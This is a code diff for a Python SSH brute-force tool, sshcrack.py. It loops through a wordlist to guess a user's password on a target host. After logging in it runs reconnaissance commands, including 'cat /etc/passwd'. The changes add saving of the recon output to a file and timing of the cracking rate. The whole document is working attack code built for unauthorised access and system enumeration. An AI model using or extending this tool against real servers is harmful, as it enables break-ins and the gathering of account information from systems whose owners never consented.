@@ -1,20 +1,24 @@
 #!venv/bin/python
 
 import sys
+import time
 from pathlib import Path
 from pexpect import pxssh
 
 
 def perform_recon(ssh):
-    print("Performing recon...\n")
+    print("Performing recon...")
     cmds = ["uptime", "uname -a", "whoami",
             "groups", "ifconfig", "cat /etc/passwd"]
+    results = []
     for cmd in cmds:
         ssh.sendline(cmd)
         ssh.prompt()
         r = ssh.before.decode("utf-8")
-        print(r.strip("\r\n"))
-        print("\n")
+        results.append(r.strip("\r\n"))
+    s = "\n\n".join(results)
+    p = Path(__file__).parent / "recon.txt"
+    p.write_text(s)
 
 
 if __name__ == '__main__':
@@ -26,8 +30,6 @@ if __name__ == '__main__':
     except IndexError:
         print("Usage: sshcrack.py WORDLIST USERNAME HOST PORT")
         sys.exit(1)
-
-    # print("Arguments:", wrd_arg, usr_arg, hst_arg, prt_arg)
 
     wrd_pth = Path(__file__).parent / f"{wrd_arg}"
     if not wrd_pth.exists():
@@ -41,7 +43,8 @@ if __name__ == '__main__':
 
     print(f"Loaded {len(pws)} passwords from '{wrd_pth.name}'")
 
-    for pw in pws:
+    clock_start = time.time()
+    for i, pw in enumerate(pws, 1):
         try:
             ssh = pxssh.pxssh()
             ssh.force_password = True
@@ -53,7 +56,11 @@ if __name__ == '__main__':
             else:
                 raise
         else:
+            clock_end = time.time()
             print(f"Logged in! Password is '{pw}'")
+            td = clock_end - clock_start
+            print(f"Took {td/60:.2f} minutes to check {i}/{len(pws)} passwords at a rate of {td/i:.2f}pw/s.")
             perform_recon(ssh)
+            print("Logging out.")
             ssh.logout()
             break
